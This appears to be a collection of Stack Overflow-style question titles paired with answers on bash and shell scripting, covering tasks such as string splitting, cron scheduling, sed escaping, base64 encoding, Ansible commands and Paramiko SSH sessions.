    "Split string into array shell script": "str=a:b:c:d:e\nset -f\nIFS=:\nary=($str)\nfor key in \"${!ary[@]}\"; do echo \"$key ${ary[$key]}\"; done\noutputs\n0 a\n1 b\n2 c\n3 d\n4 e\nAnother (bash) technique:\nstr=a:b:c:d:e\nIFS=: read -ra ary <<<\"$str\"\nThis limits the change to the IFS variable only for the duration of the read command.",
    ".sh File Not Found [duplicate]": "I solved the problem by changing the end of the line from CRLF to LF since my script was edited in windows.",
    "Bash Script - umount a device, but don't fail if it's not mounted?": "The standard trick to ignore the return code is to wrap the command in a boolean expression that always evaluates to success:\numount .... || /bin/true",
    "Delete all files but keep all directories in a bash script?": "find dir -type f -print0 | xargs -0 rm\nfind lists all files that match certain expression in a given directory, recursively. -type f matches regular files. -print0 is for printing out names using \\0 as delimiter (as any other character, including \\n, might be in a path name). xargs is for gathering the file names from standard input and putting them as a parameters. -0 is to make sure xargs will understand the \\0 delimiter.\nxargs is wise enough to call rm multiple times if the parameter list would get too big. So it is much better than trying to call sth. like rm $((find ...). Also it much faster than calling rm for each file by itself, like find ... -exec rm \\{\\}.",
    "How to encode and decode data in base64 and base64URL by using unix commands?": "tl;dr\nUse basenc(1) from coreutils:\n$ printf \"xs?>>>\" | basenc --base64\neHM/Pj4+\n$ printf \"xs?>>>\" | basenc --base64url\neHM_Pj4-\nAs with base64(1), add the -d switch to decode.\nA bit of explanation\nRecent versions of coreutils include basenc(1) which supports several different encodings. From its help screen:\n--base64          same as 'base64' program (RFC4648 section 4)\n--base64url       file- and url-safe base64 (RFC4648 section 5)\n--base32          same as 'base32' program (RFC4648 section 6)\n--base32hex       extended hex alphabet base32 (RFC4648 section 7)\n--base16          hex encoding (RFC4648 section 8)\n--base2msbf       bit string with most significant bit (msb) first\n--base2lsbf       bit string with least significant bit (lsb) first\n--z85             ascii85-like encoding (ZeroMQ spec:32/Z85);\n                  when encoding, input length must be a multiple of 4;\n                  when decoding, input length must be a multiple of 5\nHere is a string that illustrates the difference:\ns=\"xs?>>>\"\nAs binary:\n$ printf \"%s\" \"$s\" | xxd -b -c1 | cut -d' ' -f2 | nl\n     1  01111000\n     2  01110011\n     3  00111111\n     4  00111110\n     5  00111110\n     6  00111110\nAnd as 6 bit blocks (as base64 reads the data):\n$ printf \"%s\" \"$s\" | xxd -b -c1 | cut -d' ' -f2 | tr -d '\\n' | fold -w6 | nl\n     1  011110\n     2  000111\n     3  001100\n     4  111111\n     5  001111\n     6  100011\n     7  111000\n     8  111110\nNote that block 4 and block 8 map to / and + respectively (Base64 table on Wikipedia):",
    "Recommended way to do multiple shell commands with shell()": "You can call shell() multiple times within the run block of a rule (rules can specify run: rather than shell:):\nrule processing_step:\n    input:\n        # [...]\n    output:\n        # [...]\n    run:\n        shell(\"somecommand {input} > tempfile\")\n        shell(\"othercommand tempfile {output}\")\nOtherwise, since the run block accepts Python code, you could build a list of commands as strings and iterate over them:\nrule processing_step:\n    input:\n        # [...]\n    output:\n        # [...]\n    run:\n        commands = [\n            \"somecommand {input} > tempfile\",\n            \"othercommand tempfile {output}\"\n        ]\n        for c in commands:\n            shell(c)\nIf you don't need Python code during the execution of the rule, you can use triple-quoted strings within a shell block, and write the commands as you would within a shell script. This is arguably the most readable for pure-shell rules:\nrule processing_step:\n    input:\n        # [...]\n    output:\n        # [...]\n    shell:\n        \"\"\"\n        somecommand {input} > tempfile\n        othercommand tempfile {output}\n        \"\"\"\nIf the shell commands depend on the success/failure of the preceding command, they can be joined with the usual shell script operators like || and &&:\nrule processing_step:\n    input:\n        # [...]\n    output:\n        # [...]\n    shell:\n        \"command_one && echo 'command_one worked' || echo 'command_one failed'\"",
    "Provide password to ssh command inside bash script, Without the usage of public keys and Expect": "Install sshpass, then launch the command:\nsshpass -p \"yourpassword\" ssh -o StrictHostKeyChecking=no yourusername@hostname",
    "tail-like continuous ls (file list)": "You can use the very handy command watch\nwatch -n 10 \"ls -ltr\"\nAnd you will get a ls every 10 seconds.\nAnd if you add a tail -10 you will only get the 10 newest.\nwatch -n 10 \"ls -ltr|tail -10\" ",
    "Decoding JSON and a base64-encoded value in a shell script": "jq has recently added support for base64 encoding and decoding\nhttps://stedolan.github.io/jq/manual/#Formatstringsandescaping\n@base64:\nThe input is converted to base64 as specified by RFC 4648.\n@base64d:\nThe inverse of @base64, input is decoded as specified by RFC 4648. Note: If the decoded string is not UTF-8, the results are undefined.\nFor your data, the command would be\njq -r 'map(.Value | @base64d)' < file.json\nhttps://github.com/stedolan/jq/issues/47\nIt's not released yet, but you can install the latest development version to use it.\nbrew reinstall --HEAD jq\nOnce the next version of jq is released then you can switch back to the latest stable version.",
    "Passing multiple PHP variables to shell_exec()? [duplicate]": "",
    "Using groovy, how do you pipe multiple shell commands?": "This works for me :\ndef p = 'ps aux'.execute() | 'grep foo'.execute() | ['awk', '{ print $1 }'].execute()\np.waitFor()\nprintln p.text\nfor an unknown reason, the parameters of awk can't be send with only one string (i don't know why! maybe bash is quoting something differently). If you dump with your command the error stream, you'll see error relative to the compilation of the awk script.\nEdit : In fact,\n\"-string-\".execute() delegate to Runtime.getRuntime().exec(-string-)\nIt's bash job to handle arguments containing spaces with ' or \". Runtime.exec or the OS are not aware of the quotes\nExecuting \"grep ' foo'\".execute() execute the command grep, with ' as the first parameters, and foo' as the second one : it's not valid. the same for awk",
    "difference between $@ and $* in bash script [duplicate]": "If you have a script foo.sh:\nasterisk \"$*\"\nat-sign \"$@\"\nand call it with:\n./foo.sh \"a a\" \"b b\" \"c c\"\nit's equivalent to:\nasterisk \"a a b b c c\"\nat-sign \"a a\" \"b b\" \"c c\"\nWithout the quotes, they're the same:\nasterisk $*\nat-sign $@\nwould be equivalent to:\nasterisk \"a\" \"a\" \"b\" \"b\" \"c\" \"c\"\nat-sign \"a\" \"a\" \"b\" \"b\" \"c\" \"c\"",
    "Print a variable with multi-line value in shell?": "Same solution as always.\necho \"$text\"",
    "'tee' and exit status": "This works with Bash:\n(\n  set -o pipefail\n  mycommand --foo --bar | tee some.log\n)\nThe parentheses are there to limit the effect of pipefail to just the one command.\nFrom the bash(1) man page:\nThe return status of a pipeline is the exit status of the last command, unless the pipefail option is enabled. If pipefail is enabled, the pipeline's return status is the value of the last (rightmost) command to exit with a non-zero status, or zero if all commands exit successfully.",
    "unix command line execute with . (dot) vs. without": ". name sources the file called name into the current shell. So if a file contains this\nA=hello\nThen if you sources that, afterwards you can refer to a variable called A which will contain hello. But if you execute the file (given proper execution rights and #!/interpreterline), then such things won't work, since the variable and other things that script sets will only affects its subshell it is run in.\nSourcing a binary file will not make any sense: Shell wouldn't know how to interpret the binary stuff (remember it inserts the things appearing in that file into the current shell - much like the good old #include <file> mechanism in C). Example:\nhead -c 10 /dev/urandom > foo.sh; . foo.sh # don't do this at home!\nbash: \ufffd\u01fbD$\ufffd/\ufffd: file or directory not found\nExecuting a binary file, however, does make a lot of sense, of course. So normally you want to just name the file you want to execute, and in special cases, like the A=hello case above, you want to source a file.",
    "How to copy a directory with symbolic links and resolve them?": "cp -rL /source /destination\nr = recursive L = follow and expand symlinks",
    "sort logfile by timestamp on linux command line": "Use sort's --stable, --reverse, and --key options:\nsort --stable --reverse --key=1,2 freeswitch.log\n(For non-didactic purposes, this can be shortened to -srk1,2.)\nThe sort command (as you might expect) outputs each line of the named files (or STDIN) in sorted order. What each of these options does:\nThe --reverse option tells sort to sort lines with greater values (later dates) higher, rather than lower. It's assumed, based on other answers, that this is what you mean by \"descending\" (even though this kind of sorting would normally be considered \"ascending\"). If you want to sort the lines in chronological order, you would omit this option.\nThe --key=1,2 option tells sort to only use the first two whitespace-separated \"fields\" (the \"freeswitch.log:\"-prefixed date, and the time) as the key for sorting. It is important that you specify the last field to use, even if you are only sorting by one field (for instance, if each line kept time and date together in an ISO-8601 standard field like freeswitch.log 2011-09-08T12:21:07.282236, you would use -k 2,2), as, by default, the fields used by a key extend to the end of the line.\nThe --stable option tells sort to not perform \"last-resort ordering\". Without this option, a line with two equal keys (as specified with the --keys option) will then be sorted according to the entire line, meaning that the filename and/or content will change the sort order of the lines.\nIt is important to specify both extents of the --key, as well as the --stable option. Without them, multiple lines of output that occurred at the same time (in other words, a multi-line message) would be sorted according to the content of the message (without the second field in --key) and/or the filename (without --stable, if the filename is a separate field, as described below).\nIn other words, a log message like this:\nfreeswitch.log:2011-09-08 12:21:10.374238 Warning: Syntax error on line 20:\nfreeswitch.log:2011-09-08 12:21:10.374238\nfreeswitch.log:2011-09-08 12:21:10.374238    My[brackets(call)\nfreeswitch.log:2011-09-08 12:21:10.374238               ^\nfreeswitch.log:2011-09-08 12:21:10.374238 Suggestion:\nfreeswitch.log:2011-09-08 12:21:10.374238   did you forget to\nfreeswitch.log:2011-09-08 12:21:10.374238   close your brackets?\nwould get \"sorted\" into:\nfreeswitch.log:2011-09-08 12:21:10.374238\nfreeswitch.log:2011-09-08 12:21:10.374238               ^\nfreeswitch.log:2011-09-08 12:21:10.374238   close your brackets?\nfreeswitch.log:2011-09-08 12:21:10.374238   did you forget to\nfreeswitch.log:2011-09-08 12:21:10.374238    My[brackets(call)\nfreeswitch.log:2011-09-08 12:21:10.374238 Suggestion:\nfreeswitch.log:2011-09-08 12:21:10.374238 Warning: Syntax error on line 20:\nThis is \"sorted\" (because \"c\" comes before \"d\", and \"S\" comes before \"W\"), but it's not in order. Specifying --stable (and keeping your --key bounded) will skip the extra sorting and preserve the order, which is what you want.\nAlso, sorting by this combined filename-and-date field will only work if every line in your output starts with the same filename. Given the syntax you posted, if your input has multiple, different filenames that you want to ignore in sorting, you need to use a program like sed to convert the filename to its own space-separated field, then pipe the converted lines to sort (after which you may then convert the field separators back):\nsed 's/:/ /' freeswitch.log | sort -srk2,3 | sed 's/ /:/'\nNote that the fields used by the key are changed to 2,3, skipping the first (filename) field.",
    "How do I create a cron job that will run everyday at 12:20am?": "The crontab for \"everyday at 12:20am\" is\n20 0 * * *\nThe whole line in crontab would then be\n20 0 * * * /usr/bin/ruby /Users/tamer/scripts/sftp.rb",
    "List all files older than x days only in current directory": "You can do this:\nfind ./ -maxdepth 1 -type f -mtime +30 -print\nIf having problems, do:\nfind ./ -depth 1 -type f -mtime +30 -print",
    "Bash script runs manually, but fails on crontab": "The problem is probably that your $PATH is different in the manual environment from that under which crontab runs. Hence, which can't find your executables. To fix this, first print your path in the manual environment (echo $PATH), and then manually set up PATH at the top of the script you run in crontab. Or just refer to the programs by their full path.\nEdit: Add this near the top of your script, before all the which calls:\nexport PATH=\"/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/mysql/bin:/opt/android-sdk-linux/tools:/opt/android-sdk-linux/platform-tools:~/usr/lib/jvm/jdk-6/bin\"",
    "Set Environment Variables with Puppet": "If you only need the variables available in the puppet run for all exec resources, whats wrong with :\nExec { environment => [ \"foo=$bar\" ] }\n?",
    "Cannot split, a bytes-like object is required, not 'str' [duplicate]": "If your question boils down to this:\nI've tried using decode and encode but it still yells at me that the split method cannot use the datatype.\nThe error at hand can be demonstrated by the following code:\n>>> blah = b'hello world'  # the \"bytes\" produced by check_output\n>>> blah.split('\\n')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: a bytes-like object is required, not 'str'\nIn order to split bytes, a bytes object must also be provided. The fix is simply:\n>>> blah.split(b'\\n')\n[b'hello world']",
    "how to concatenate lines into one string": "Use paste\n$ echo -e 'one\\ntwo\\nthree' | paste -s -d':'\none:two:three",
    "How to do the opposite of diff? [duplicate]": "Here is a solution that WILL NOT change the order of the lines:\nfgrep -x -f file1 file2",
    "How to suppress irrelevant ShellCheck messages?": "Think it through before doing this!\nDo this only if you are 100.0% positive that the message(s) is really irrelevant. Then, read the Wiki here and here on this topic.\nOnce you assured yourself the message(s) is irrelevant\nWhile generally speaking, there are more ways to achieve this goal, I said to disable those messages locally, so there is only one in reality.\nThat being adding the following line before the actual message occurrence:\n# shellcheck disable=code\nNotably, adding text after that in the same line will result in an error as it too will be interpreted by shellcheck. If you want to add an explanation as to why you are suppressing the warning, you can add another hash # to prevent shellcheck from interpreting the rest of the line.\nIncorrect:\n# shellcheck disable=code irrelevant because reasons\nCorrect:\n# shellcheck disable=code # code is irrelevant because reasons\nNote, that it is possible to add multiple codes separated by comma like this example:\n# shellcheck disable=SC2119,SC2120\nNote, that the #  in front is an integral part of disabling directive!",
    "How to escape the ampersand character while using sed": "You don't need to escape anything in the input:\n$ echo \"123 ' foo & b'ar\" | sed \"s/'/''/g\"\n123 '' foo & b''ar\nHowever, in the 'replacement' part of the s command & has a special meaning: it means 'match'. That's why the above command can be re-written as:\n$ echo \"123 ' foo & b'ar\" | sed \"s/'/&&/g\"\n123 '' foo & b''ar\nEscape it with a \\ like everything else that needs to be escaped, if needed:\n$ echo \"123 ' foo & b'ar\" | sed \"s/'/'\\&'/g\"\n123 '&' foo & b'&'ar",
    "How to schedule a task wether the user is logged on or not in PowerShell?": "You'll need to specify a user (like /RU system), but it should be the default whether to run logged in or not. You can look at this link for a list of all schtasks.exe parameters.",
    "Extract list of specific frames using ffmpeg": "Use\nffmpeg -i in.mp4 -vf select='eq(n\\,100)+eq(n\\,184)+eq(n\\,213)' -vsync 0 frames%d.jpg\nFFmpeg is primarily a processor of timed video i.e. media with a cycle rate such as framerate or sample rate. It assumes that the output should be at the same rate as the source. If inadequate frames are supplied, it duplicates unless told not to. -vsync 0 is added which, in this case, tells it to suppress duplication.",
    "How do I determine if a directory is a mounted NFS mount point in shellscript": "This question is effectively a dup of how-can-i-tell-if-a-file-is-on-a-remote-filesystem-with-perl\nThe short answer is to use the stat command\neg\n$ stat -f -L -c %T localdir\next2/ext3\n$ stat -f -L -c %T remotedir\nnfs\nThen a directory is an NFS mount point if its type is 'nfs' and its parent directory isn't.",
    "How to run Ansible without hosts file": "you can do like this:\nansible all -i \"<hostname-or-ip>,\" -a 'uptime'\nNote the , at the end of the IP address, or it will be considered a hosts inventory filename.\nHere is an example for reference:\nansible all -i \"192.168.33.100,\" -a 'uptime'\n\n192.168.33.100 | SUCCESS | rc=0 >>\n 12:05:10 up 10 min,  1 user,  load average: 0.46, 0.23, 0.08",
    "How to remove newline from output?": "From the OpenSSL Wiki for enc.\nTo suppress this you can use in addition to -base64 the -A flag. This will produce a file with no line breaks at all.\nSo adding the additional -A flag will do the trick.\npassword=\"abc123\"\nhashPassw=\"$(/bin/echo -n \"${password}\" | openssl dgst -binary -sha512 | openssl enc -A -base64)\"\necho \"${hashPassw}\"\nWhich outputs\nxwtd2ev7b1HQnUEytxcMnSB1CnhS8AaA9lZY8DEOgQBW5nY8NMmgCw6UAHb1RJXBafwjAszrMSA5JxxDRpUH3A==",
    "How to capture output from a remote command in Capistrano?": "Maybe capture?\n\"The capture helper will execute the given command on the first matching server, and will return the output of the command as a string.\"\nhttps://github.com/capistrano/capistrano/wiki/2.x-DSL-Action-Inspection-Capture",
    "Build and run an app on simulator using xcodebuild": "",
    "How do AND and OR operators work in Bash?": "From man bash\n3.2.3 Lists of Commands\nA list is a sequence of one or more pipelines separated by one of the operators \u2018;\u2019, \u2018&\u2019, \u2018&&\u2019, or \u2018||\u2019, and optionally terminated by one of \u2018;\u2019, \u2018&\u2019, or a newline.\nOf these list operators, \u2018&&\u2019 and \u2018||\u2019 have equal precedence, followed by \u2018;\u2019 and \u2018&\u2019, which have equal precedence.\nSo, your example\necho this || echo that && echo other\ncould be read like\n(this || that) && other",
    "print $PATH line by line": "tr tool\nUsing tr:\necho $PATH | tr : '\\n'",
    "How to resume failed/interrupted downloads with SFTP?": "(Assuming, you are using OpenSSH sftp), use its reget command. It has the same syntax as the get, except that it starts a transfer from the end of an existing local file.\nThe same effect has -a switch to the get command or global command-line -a switch of sftp.\nSimilarly for resuming an upload, use reput command.\nYou need OpenSSH 6.3 and later [on the client side] for these features.",
    "Difference between echo and @echo in unix shells": "That's a Makefile-specific thing; it has nothing to do with shell scripts.\nRecipes that begin with @ do not echo the command. That is to say, with a Makefile\nfoo:\n    echo foo\nYou get\n$ make foo        # <-- this is meant to be the command you enter in the shell\necho foo\nfoo\nWhereas with a Makefile\nfoo:\n    @echo foo\nit is\n$ make foo\nfoo",
    "Daemonizing an executable in ansible": "Running program with '&' does not make program a daemon, it just runs in background. To make a \"true daemon\" your program should do steps described here.\nIf your program is written in C, you can call daemon() function, which will do it for you. Then you can start your program even without '&' at the end and it will be running as a daemon.\nThe other option is to call your program using daemon, which should do the job as well.\n- name: Start daemon\n  shell: daemon -- myexeprogram arg1 arg2",
    "Calling rm from subprocess using wildcards does not remove the files": "The problem is that you are passing two arguments to subprocess.Popen: rm and a path, such as /home/user/t* (if the prefix is t). Popen then will try to remove a file named exactly this way: t followed by an asterisk at the end.\nIf you want to use Popen with the wildcard, you should pass the shell parameter as True. In this case, however, the command should be a string, not a list of arguments:\nPopen(\"%s %s\" % (cmd, args), shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)\n(Otherwise, the list of arguments will be given to the new shell, not to the command)\nAnother solution, safer and more efficient, is to use the glob module:\nimport glob\nfiles = glob.glob(prepend+\"*\")\nargs = [cmd] + files\nPopen(args,  stdin=PIPE, stdout=PIPE, stderr=PIPE)\nHowever, I agree that Levon's solution is the saner one. In this case, glob is the answer too:\nfiles = glob.glob(prepend+\"*\")\nfor file in files:\n    os.remove(file)",
    "Shell script to check git for changes and then loop through changed files?": "For your first question, you can use git diff --quiet (or git diff --exit-code, but generally when you're using it for its exit code you want it not to print output anyhow, and git diff --quiet implies --exit-code) to determine if there have been any changes. That will give you a 1 value if there are changes, and a 0 if there are not. So if you want to have code that will run only if there are changes:\nif ! git --git-dir=\"/dir/.git\" diff --quiet\nthen\n    # do stuff...\nfi\nFor your second question, I'd recommend a while read ... loop to read lines from git diff-tree:\ngit --git-dir=\"/dir/.git\" diff-tree ORIG_HEAD.. | \\\n    while read srcmode dstmode srcsha dstsha status srcfile dstfile\n    do\n        # do something with $srcfile and $dstfile\n    done\nNote that $srcmode will have an extra : at the beginning, and $dstfile will only have a value if the file was renamed. If you don't want to worry about renames, pass in --no-renames, and instead of seeing renames you'll see just the adds and deletes.",
    "Implement an interactive shell over ssh in Python using Paramiko?": "import paramiko\nimport re\n\n\nclass ShellHandler:\n\n    def __init__(self, host, user, psw):\n        self.ssh = paramiko.SSHClient()\n        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n        self.ssh.connect(host, username=user, password=psw, port=22)\n\n        channel = self.ssh.invoke_shell()\n        self.stdin = channel.makefile('wb')\n        self.stdout = channel.makefile('r')\n\n    def __del__(self):\n        self.ssh.close()\n\n    def execute(self, cmd):\n        \"\"\"\n\n        :param cmd: the command to be executed on the remote computer\n        :examples:  execute('ls')\n                    execute('finger')\n                    execute('cd folder_name')\n        \"\"\"\n        cmd = cmd.strip('\\n')\n        self.stdin.write(cmd + '\\n')\n        finish = 'end of stdOUT buffer. finished with exit status'\n        echo_cmd = 'echo {} $?'.format(finish)\n        self.stdin.write(echo_cmd + '\\n')\n        shin = self.stdin\n        self.stdin.flush()\n\n        shout = []\n        sherr = []\n        exit_status = 0\n        for line in self.stdout:\n            if str(line).startswith(cmd) or str(line).startswith(echo_cmd):\n                # up for now filled with shell junk from stdin\n                shout = []\n            elif str(line).startswith(finish):\n                # our finish command ends with the exit status\n                exit_status = int(str(line).rsplit(maxsplit=1)[1])\n                if exit_status:\n                    # stderr is combined with stdout.\n                    # thus, swap sherr with shout in a case of failure.\n                    sherr = shout\n                    shout = []\n                break\n            else:\n                # get rid of 'coloring and formatting' special characters\n                shout.append(re.compile(r'(\\x9B|\\x1B\\[)[0-?]*[ -/]*[@-~]').sub('', line).\n                             replace('\\b', '').replace('\\r', ''))\n\n        # first and last lines of shout/sherr contain a prompt\n        if shout and echo_cmd in shout[-1]:\n            shout.pop()\n        if shout and cmd in shout[0]:\n            shout.pop(0)\n        if sherr and echo_cmd in sherr[-1]:\n            sherr.pop()\n        if sherr and cmd in sherr[0]:\n            sherr.pop(0)\n\n        return shin, shout, sherr",
    "Brace expansion in python glob": "Combining globbing with brace expansion.\npip install braceexpand\nSample:\nfrom glob import glob\nfrom braceexpand import braceexpand\n\ndef braced_glob(path):\n    l = []\n    for x in braceexpand(path):\n        l.extend(glob(x))\n            \n    return l\n>>> braced_glob('/usr/bin/{x,z}*k')  \n['/usr/bin/xclock', '/usr/bin/zipcloak']",
    "module: command not found": "I tried to reproduce it and it turns out that for me sourcing\nsource /etc/profile.d/modules.sh\nin th .sh script helps for bash and similar. For csh and tcsh, you have to add\nsource /etc/profile.d/modules.csh\nto the script. Note, that this line must come first and then the\nmodule load foo\nline.",
    "How to return spawned process exit code in Expect script?": "You're already waiting for the eof at the end of your loop, you just need to use wait and catch the result:\nspawn true\nexpect eof\ncatch wait result\nexit [lindex $result 3]\nExits with 0.\nspawn false\nexpect eof\ncatch wait result\nexit [lindex $result 3]\nExits with 1.",
    "chmod: changing permissions of \u2018my_script.sh\u2019: Operation not permitted": "Resolving the operation not permitted error:\nsudo chmod u+x my_script.sh\nYou created the file via:\nsudo vi my_script.sh\n# editing\nThis means, the owner and group of the file is root. You are not allowed to change files of it by default. You need to change permission (chmod does it) or change the owner:\nsudo chown you:yourgroup my_script.sh\nThis should do it. Save the trouble, without creating the file via sudo.",
    "How to get return (status) value of an external command in Vim": "There is v:shell_error variable that has exactly the same value as $? in shell scripts. Works at least after :!, :read !, calling system().",
    "Using regular expressions in shell script": "The grep command will select the desired line(s) from many but it will not directly manipulate the line. For that, you use sed in a pipeline:\nsomeCommand | grep 'Amarghosh' | sed -e 's/foo/bar/g'\nAlternatively, awk (or perl if available) can be used. It's a far more powerful text processing tool than sed in my opinion.\nsomeCommand | awk '/Amarghosh/ { do something }'\nFor simple text manipulations, just stick with the grep/sed combo. When you need more complicated processing, move on up to awk or perl.\nMy first thought is to just use:\necho '{\"displayName\":\"Amarghosh\",\"reputation\":\"2,737\",\"badgeHtml\"'\n    | sed -e 's/.*tion\":\"//' -e 's/\".*//' -e 's/,//g'\nwhich keeps the number of sed processes to one (you can give multiple commands with -e).",
    "Getting \"numeric argument required\" when running a script with arithmetic operations": "Another couple of points:\ndon't return \"$total\": a return value is an int between 0 and 255. You need to echo \"$total\"\nyou're going to have errors when the hour/minute/second is 08 or 09 -- bash treats numbers with leading zero as octal, and 8 and 9 are invalid octal digits.\n$ mili 11:22:09,456\nhr is:  11\nmin is:  22\nsec is:  09\nms is:  456\nbash: (11 * 3600 + 22 * 60 + 09: value too great for base (error token is \"09\")\nI'd write:\nmili () {     \n    IFS=\":,.\" read -r hr min sec ms <<<\"$1\"\n    echo \"hr is:   $hr\" >&2\n    echo \"min is:  $min\" >&2\n    echo \"sec is:  $sec\" >&2\n    echo \"ms is:  $ms\" >&2\n    echo \"$(( ((10#$hr * 60 + 10#$min) * 60 + 10#$sec) * 1000 + 10#$ms ))\"\n}\nwhere the 10# forces base-10 numbers\nthen\n$ ms=$(mili 11:22:09.456)\nhr is:   11\nmin is:  22\nsec is:  09\nms is:  456\n\n$ echo $ms\n40929456",
    "List bash \"bind -x\" bindings": "The above answer returned empty output on bash 4.3.48 for me. But capital \u2018P\u2019 does work:\nbind - display all function names (and bindings)\nThis will only give you bindings to functions:\nbind -P\nExplanation\n          -P     List current readline function names and bindings.\n          -p     Display  readline  function  names and bindings in such a\n                 way that they can be re-read.\nSample output\nset-mark can be found on \"\\C-@\", \"\\e \".\nshell-expand-line can be found on \"\\e\\C-e\".\nstart-kbd-macro can be found on \"\\C-x(\".\ntilde-expand can be found on \"\\e&\".\ntranspose-chars can be found on \"\\C-t\".\ntranspose-words can be found on \"\\et\".\nundo can be found on \"\\C-x\\C-u\", \"\\C-_\".\nunix-line-discard can be found on \"\\C-u\".\nunix-word-rubout can be found on \"\\C-w\".\nupcase-word can be found on \"\\eu\".\nyank can be found on \"\\C-y\".\nyank-last-arg can be found on \"\\e.\", \"\\e_\".\nyank-nth-arg can be found on \"\\e\\C-y\".\nyank-pop can be found on \"\\ey\".\nbind - display all string insertions\nThis will give you bindings for arbitrary keystrokes:\nbind -S\n      -S                 List key sequences that invoke macros and their values\n      -s                 List key sequences that invoke macros and their values\n                         in a form that can be reused as input.\nsample output:\n\\el outputs ls -lrtha --color=always\\C-j\n\\ep outputs pwd\\C-j\n\\er outputs docker rm\n\\ew outputs wget --no-check-certificate \\\"\\\"\\e[D\nmanpage\nSince it's surprisingly difficult to find the manpage for it, here it is:\nbind [-m keymap] [-lpsvPSVX]\n       bind [-m keymap] [-q function] [-u function] [-r keyseq]\n       bind [-m keymap] -f filename\n       bind [-m keymap] -x keyseq:shell-command\n       bind [-m keymap] keyseq:function-name\n       bind readline-command\n              Display current readline key and function bindings, bind  a  key\n              sequence  to  a  readline  function  or macro, or set a readline\n              variable.  Each non-option argument is a  command  as  it  would\n              appear  in  .inputrc, but each binding or command must be passed\n              as a separate argument; e.g.,  '\"\\C-x\\C-r\":  re-read-init-file'.\n              Options, if supplied, have the following meanings:\n              -m keymap\n                     Use keymap as the keymap to be affected by the subsequent\n                     bindings.    Acceptable   keymap   names    are    emacs,\n                     emacs-standard,   emacs-meta,  emacs-ctlx,  vi,  vi-move,\n                     vi-command,  and  vi-insert.    vi   is   equivalent   to\n                     vi-command; emacs is equivalent to emacs-standard.\n              -l     List the names of all readline functions.\n              -p     Display  readline  function  names and bindings in such a\n                     way that they can be re-read.\n              -P     List current readline function names and bindings.\n              -s     Display readline key sequences bound to  macros  and  the\n                     strings  they  output  in such a way that they can be re-\n                     read.\n              -S     Display readline key sequences bound to  macros  and  the\n                     strings they output.\n              -v     Display  readline variable names and values in such a way\n                     that they can be re-read.\n              -V     List current readline variable names and values.\n              -f filename\n                     Read key bindings from filename.\n              -q function\n                     Query about which keys invoke the named function.\n              -u function\n                     Unbind all keys bound to the named function.\n              -r keyseq\n                     Remove any current binding for keyseq.\n              -x keyseq:shell-command\n                     Cause shell-command to be  executed  whenever  keyseq  is\n                     entered.   When shell-command is executed, the shell sets\n                     the  READLINE_LINE  variable  to  the  contents  of   the\n                     readline  line  buffer and the READLINE_POINT variable to\n                     the current location of  the  insertion  point.   If  the\n                     executed  command  changes  the value of READLINE_LINE or\n                     READLINE_POINT, those new values will be reflected in the\n                     editing state.\n              -X     List  all  key  sequences bound to shell commands and the\n                     associated commands in a format that  can  be  reused  as\n                     input.\n\n              The  return value is 0 unless an unrecognized option is given or\n              an error occurred.",
    "Importing shell script function": "Yes, you can do like you mentioned above or like: . FILENAME\nThe file need not to end with .sh",
    "What is the meaning of the `+`, `-` and ` ` signs that precedes `Done` when a background process ends?": "So here is my understanding of it:\n1- Job flagged or having a + is the one that was sent to the background last.\n2- Job flagged or having a - was sent to the background second last.\n3- Other background jobs are not flagged.\nHere is an example I just ran on my system\n$bash: /singh/test1 &\n[1] 9223\n$bash:  /singh/test2 &\n[2] 9226\n$bash:  /singh/test3 &\n[3] 9234\n$bash:  /singh/test4 &\n[4] 9237\n$bash:  jobs\n[1]   Running                 /singh/test &\n[2]   Running                 /singh/test2 &\n[3]-  Running                 /singh/test3 &\n[4]+  Running                 /singh/test4 &\nI could see from man bash:\nThere are a number of ways to refer to a job in the shell. The character % introduces a job specification (jobspec). Job number n may be referred to as %n. A job may also be referred to using a prefix of the name used to start it, or using a substring that appears in its command line. For example, %ce refers to a stopped ce job. If a prefix matches more than one job, bash reports an error. Using %?ce, on the other hand, refers to any job containing the string ce in its command line. If the substring matches more than one job, bash reports an error. The symbols %% and %+ refer to the shell\u2019s notion of the current job, which is the last job stopped while it was in the foreground or started in the background. The previous job may be referenced using %-. If there is only a single job, %+ and %- can both be used to refer to that job. In output pertaining to jobs (e.g., the output of the jobs command), the current job is always flagged with a +, and the previous job with a -. A single % (with no accompanying job specification) also refers to the current job.",
    "git alias for shell command to cd into git root not working as expected": "Your shell is invoking Git, and Git is invoking another shell in which to run your cd command. This command is successful, and this changes the working directory of the child shell, but it does not change the working directory of Git, nor of the parent shell.\nIn order to do this you need to run the command in your current shell, which means that invoking Git will not be able to accomplish this. You will have to continue using a shell alias.\nTo illustrate, let's say you have the following shell script called up.sh:\n#!/bin/sh\ncd ..\nIf you execute this script as ./up.sh then nothing will change from the perspective of your current shell, because cd was executed in a new shell instance. However, if you execute it as . up.sh, this instructs your current shell to execute the contents of the file by itself, without spawning a subshell. In that case the current shell's working directory will change.\nThat's the key difference here. Using a Git alias is similar to the ./up.sh method, while a shell alias is similar to the . up.sh method.",
    "Run shell command in Clojure from specific location": "clojure.java.shell/sh supports a :dir option to set the working directory of the sub-process:\n(clojure.java.shell/sh \"git\" \"log\" :dir \"/path/to/some/directory\")\nSee here.",
    "Shell Variable capacity [duplicate]": "IIRC, bash does not impose a limit on how much data a variable can store. It is however limited by the environment that bash was executed under. See this answer for a more comprehensive explanation.",
    "Open Chrome from terminal with developer console open": "The flag you're looking for is --auto-open-devtools-for-tabs. Please note, that you should quit Chrome before this setting will take effect.\nThis has worked at least since Chrome 55.0.2883.87 m (the latest version as of initial post)",
